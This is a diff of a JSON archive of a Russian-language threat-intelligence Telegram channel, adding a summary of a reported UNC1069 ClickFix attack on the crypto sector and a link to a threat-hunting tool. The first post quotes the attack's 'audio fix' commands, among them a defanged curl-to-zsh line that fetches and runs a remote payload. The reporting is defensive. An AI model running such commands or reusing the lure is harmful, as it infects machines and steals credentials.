@@ -1,8 +1,22 @@
 {
   "channel": "ThreatHuntingFather",
-  "last_update": "2026-02-10T05:40:15.984117+00:00",
-  "messages_count": 119,
+  "last_update": "2026-02-10T10:05:11.065534+00:00",
+  "messages_count": 121,
   "messages": [
+    {
+      "id": "1153",
+      "title": "UNC1069 Targets Cryptocurrency Sector with New Tooling and AI-Enabled Social Engineering",
+      "text": "UNC1069 Targets Cryptocurrency Sector with New Tooling and AI-Enabled Social Engineering\nХороший заголовок? 😃\nUNC1069 провёл целевую атаку на представителя криптосектора через социальную инженерию. Жертву завели в фейковую Zoom-встречу через скомпрометированный Telegram-аккаунт, имитировали проблемы со звуком и применили ClickFix - запуск «диагностических» команд привёл к заражению macOS\nsystem_profiler SPAudioData\nsoftwareupdate --evaluate-products --products audio --agree-to-license\ncurl -A audio -s hxxp://mylingocoin[.]com/audio/fix/6454694440 | zsh\nsystem_profiler SPSoundCardData\nsoftwareupdate --evaluate-products --products soundcard\nsystem_profiler SPSpeechData\nsoftwareupdate --evaluate-products --products speech --agree-to-license\nПосле выполнения команд был развернут многоступенчатый тулчейн: WAVESHAPER → HYPERCALL → HIDDENCALL / SUGARLOADER / SILENCELIFT, а затем два стилера - DEEPBREATH (TCC bypass, Keychain, браузеры, Telegram, Notes) и CHROMEPUSH (Chromium-extension, cookies, keylogging). Цель - массовый сбор учётных данных и сессий для финансовой кражи и последующих атак.\nНо самое интересное из этого текста мы говорит не восстановили AI, но чет похожее видели, как по вашему это норм или стрем? 😃\nWhile Mandiant was unable to recover forensic evidence to independently verify the use of AI models in this specific instance, the reported ruse is similar to a previously publicly reported incident with similar characteristics, where deepfakes were also allegedly used.\n🔗 https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering\n🦔 THF\n\n[Media: Фото]",
+      "link": "https://t.me/ThreatHuntingFather/1153",
+      "pub_date": "2026-02-10T08:03:05+00:00"
+    },
+    {
+      "id": "1152",
+      "title": "Вот смотрите, коротко к чему приводит Threat Hunting 😃 💊",
+      "text": "Вот смотрите, коротко к чему приводит Threat Hunting 😃 💊\nРешая нетривиальную задачу в атакованной сети, человек просто идет и пишет тул как настоящий блэкхэт, так как зона мониторинга может быть ограничена, только вот он ищет пивот поинты APT, а не нацелен на файлики и конф. данные.\n#IncidentResponce #ThreatHunting\nТулза вот доступна тут:\n🔗 https://github.com/s0ld13rr/tarahunter\nАвтор 🎩:\nhttps://t.me/s0ld13r_ch/352",
+      "link": "https://t.me/ThreatHuntingFather/1152",
+      "pub_date": "2026-02-10T06:53:57+00:00"
+    },
     {
       "id": "1145",
       "title": "PeckBirdy: A Versatile Script Framework for LOLBins Exploitation Used by China-aligned Threat Groups",
